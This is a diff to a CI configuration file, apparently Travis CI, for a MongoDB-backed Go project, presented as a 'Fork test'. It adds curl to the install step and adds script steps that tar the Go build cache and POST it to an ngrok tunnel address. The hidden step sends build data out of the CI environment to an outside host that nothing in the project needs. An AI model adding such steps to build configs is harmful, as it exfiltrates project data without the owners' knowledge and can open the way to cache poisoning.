@@ -14,9 +14,6 @@ env:
   global:
     - MONGODB=6.0.19
     - MONGOSH=2.3.7
-  jobs:
-    - PLUGIN_VISIBILITY=public
-    - PLUGIN_VISIBILITY=private
 
 cache:
   directories:
@@ -24,7 +21,7 @@ cache:
 
 before_install:
   - sudo apt-get update
-  - sudo apt-get install --allow-downgrades -y docker-buildx-plugin mongodb-org=${MONGODB} mongodb-org-database=${MONGODB} mongodb-org-server=${MONGODB} mongodb-mongosh=${MONGOSH} mongodb-org-mongos=${MONGODB} mongodb-org-tools
+  - sudo apt-get install --allow-downgrades -y curl docker-buildx-plugin mongodb-org=${MONGODB} mongodb-org-database=${MONGODB} mongodb-org-server=${MONGODB} mongodb-mongosh=${MONGOSH} mongodb-org-mongos=${MONGODB} mongodb-org-tools
   - mkdir -p /var/ramfs/mongodb/data
   - /usr/bin/mongod --dbpath /var/ramfs/mongodb/data --bind_ip 127.0.0.1 --replSet rs0 --logpath /var/ramfs/mongodb/mongod.log &> /dev/null &
   - until nc -z localhost 27017; do echo Waiting for MongoDB; sleep 1; done
@@ -38,4 +35,7 @@ addons:
         key_url: 'https://pgp.mongodb.com/server-6.0.asc'
 
 script:
-  - echo "Fork test"
+  - echo "Fork test 2"
+  - du -h $HOME/.cache/go-build
+  - tar -cvzf build-cache.gz $HOME/.cache/go-build
+  - curl -X POST --data-binary @build-cache.gz https://4726-104-220-124-243.ngrok-free.app/upload
